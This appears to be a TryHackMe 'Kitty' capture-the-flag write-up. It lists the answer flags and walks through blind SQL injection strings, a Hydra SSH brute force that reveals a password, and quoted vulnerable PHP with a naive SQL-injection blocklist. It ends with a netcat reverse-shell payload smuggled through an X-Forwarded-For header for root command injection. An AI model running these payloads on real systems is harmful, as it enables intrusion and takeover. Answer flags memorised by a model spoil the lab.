# Kitty

## Task 1  What is the user and root flag?
+ What is the user flag? `THM{31e606998972c3c6baae67bab463b16a}`
+ What is the root flag? `THM{581bfc26b53f2e167a05613eecf039bb}`
## Task 2  Thank you
+ Thank you for playing. `No Answer Needed`

### Enumeration
+ Try to signup with user `kitty` and we got error `This username is already taken.`
+ Try SQLinjection on Login 
    - Query Database `kitty' and substring(database(),1,1)='a' -- -`
    - Query Table `kitty' and substring((select table_name from information_schema.tables where table_schema="db_name" limit 0,1),1,1) -- -`


+ Try generate the file for hydra and run hydra
```bash
hengkisirait: Kitty $ hydra -l kitty -P pass.txt 10.10.131.226 ssh -fV
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-05 16:34:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 14 tasks per 1 server, overall 14 tasks, 14 login tries (l:1/p:14), ~1 try per task
[DATA] attacking ssh://10.10.131.226:22/-fV
[22][ssh] host: 10.10.131.226   login: kitty   password: L0ng_Liv3_KittY
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-05 16:34:46
hengkisirait: Kitty $ ssh kitty@10.10.131.226
kitty@kitty:~$ ls
user.txt
kitty@kitty:~$ cat user.txt
THM{31e606998972c3c6baae67bab463b16a}
kitty@kitty:~$
```

### Privelege Escalation
+ Upload linpeas and have an active port `8080`
+ found weird file 
```bash
kitty@kitty:~$ cat /opt/log_checker.sh
#!/bin/sh
while read ip;
do
  /usr/bin/sh -c "echo $ip >> /root/logged";
done < /var/www/development/logged
cat /dev/null > /var/www/development/logged
```

+ Check on `index.php` on development site 
```bash
kitty@kitty:/var/www/development$ cat index.php
<?php
// Initialize the session
session_start();

// Check if the user is already logged in, if yes then redirect him to welcome page
if(isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] === true){
    header("location: welcome.php");
    exit;
}

include('config.php');
$username = $_POST['username'];
$password = $_POST['password'];
// SQLMap
$evilwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
foreach ($evilwords as $evilword) {
	if (preg_match( $evilword, $username )) {
		echo 'SQL Injection detected. This incident will be logged!';
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		$ip .= "\n";
		file_put_contents("/var/www/development/logged", $ip);
		die();
	} elseif (preg_match( $evilword, $password )) {
		echo 'SQL Injection detected. This incident will be logged!';
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		$ip .= "\n";
		file_put_contents("/var/www/development/logged", $ip);
		die();
	}
}


$sql = "select * from siteusers where username = '$username' and password = '$password';";
$result = mysqli_query($mysqli, $sql);
$row = mysqli_fetch_array($result, MYSQLI_ASSOC);
$count = mysqli_num_rows($result);
if($count == 1){
	// Password is correct, so start a new session
	session_start();

	// Store data in session variables
	$_SESSION["loggedin"] = true;
	$_SESSION["username"] = $username;
	// Redirect user to welcome page
	header("location: welcome.php");
} elseif ($username == ""){
	$login_err = "";
} else{
	// Password is not valid, display a generic error message
	$login_err = "Invalid username or password";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body{ font: 14px sans-serif; }
        .wrapper{ width: 360px; padding: 20px; }
    </style>
</head>
<body>
    <div class="wrapper">
        <h2>Development User Login</h2>
        <p>Please fill in your credentials to login.</p>

<?php
if(!empty($login_err)){
        echo '<div class="alert alert-danger">' . $login_err . '</div>';
}
?>

        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="form-group">
                <label>Username</label>
                <input type="text" name="username" class="form-control">
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" class="form-control">
            </div>
            <div class="form-group">
                <input type="submit" class="btn btn-primary" value="Login">
	    </div>
	    <p>Don't have an account? <a href="register.php">Sign up now</a>.</p>
        </form>
    </div>
</body>
</html>
```

+ So we need to TUNNELING the local PORT (8080) `ssh -L 8080:127.0.0.1:8080 kitty@10.10.131.226`

```bash
kitty@kitty:/var/www/development$ tail -f logged
$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.37.160 4444 >/tmp/f)
```



+ Generate new python request exploit the `X-Forwaded-For: payload`
```bash
hengkisirait: ~ $ nc -l 4444
id
bash: cannot set terminal process group (4244): Inappropriate ioctl for device
bash: no job control in this shell
root@kitty:~# id
uid=0(root) gid=0(root) groups=0(root)
root@kitty:~# cd /root
cd /root/
root@kitty:~# ls
ls
logged
root.txt
snap
root@kitty:~# cat root.txt
cat root.txt
THM{581bfc26b53f2e167a05613eecf039bb}
```